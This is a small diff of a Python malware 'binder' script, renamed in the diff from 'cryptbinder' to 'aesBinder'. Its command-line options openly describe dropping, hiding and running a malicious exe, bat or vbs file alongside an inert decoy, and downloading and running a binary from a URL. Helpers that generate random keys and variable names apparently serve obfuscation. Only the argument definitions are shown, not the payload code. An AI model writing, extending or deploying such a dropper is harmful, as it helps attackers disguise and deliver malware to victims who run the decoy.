@@ -23,7 +23,7 @@ def randKey(bytes):
 def randVar():
 	return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))
 
-parser = argparse.ArgumentParser(prog='cryptbinder', usage='./cryptbinder.py [options]')
+parser = argparse.ArgumentParser(prog='aesBinder', usage='./aesBinder.py [options]')
 parser.add_argument('-m', "--mexe", type=str, help='Malicious exe/bat/vbs to drop, hide and run.')
 parser.add_argument('-i', "--iexe", type=str, help='Inert exe/bat/vbs to drop and run.')
 parser.add_argument("-u", "--url", type=str, help="URL to download and run binary from.")
